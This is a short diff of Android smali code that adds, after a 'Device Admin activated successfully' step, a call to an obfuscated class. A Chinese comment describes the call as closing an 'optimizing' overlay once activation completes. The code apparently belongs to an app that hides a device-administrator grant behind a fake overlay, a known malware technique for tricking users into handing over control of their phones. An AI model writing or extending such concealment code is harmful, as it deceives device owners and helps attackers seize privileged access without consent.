@@ -50,6 +50,9 @@
 
     invoke-interface {p2}, Landroid/content/SharedPreferences$Editor;->apply()V
 
+    # 2.2：激活完成，关闭“优化中”遮罩
+    invoke-static {}, Lڗًقڔ/؋;->ؿ()V
+
     const-string p2, "DAActivator"
 
     const-string v0, "Device Admin activated successfully"
